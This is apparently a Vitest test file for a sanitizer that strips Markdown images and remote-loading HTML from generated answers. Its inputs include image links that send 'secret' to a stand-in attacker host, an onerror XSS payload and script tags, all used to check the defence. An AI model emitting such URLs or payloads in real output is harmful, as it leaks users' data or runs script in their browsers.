import { describe, expect, it } from 'vitest';
import { stripRemoteContent } from '../src/answer';

describe('stripRemoteContent', () => {
	it('removes Markdown images so rendering cannot send a request', () => {
		expect(stripRemoteContent('See ![x](https://evil.example/?q=secret) now')).toBe('See  now');
		expect(stripRemoteContent('![](https://evil.example/a.png)')).toBe('');
		expect(stripRemoteContent('![alt][ref]\n\n[ref]: https://evil.example/a.png')).toBe('\n\n[ref]: https://evil.example/a.png');
	});

	it('removes raw HTML that loads content, in any case, even unfinished', () => {
		for (const html of ['<img src="https://evil.example/x">', '<IMG SRC=x onerror=alert(1)>', '<iframe src="https://e"></iframe>', '<img src="https://e', '<script>x()</script>', '<video src=x>', '< img src=x>']) {
			expect(stripRemoteContent(`a ${html} b`), html).not.toMatch(/<\s*(img|iframe|video|script)/i);
		}
	});

	it('keeps links, wiki links, embeds of notes and ordinary text', () => {
		const text = 'An agent harness [wraps](https://example.com) a model. See [[Agent harness]], ![[Tool use]] and 1 < 2 > 0.';
		expect(stripRemoteContent(text)).toBe(text);
	});
});
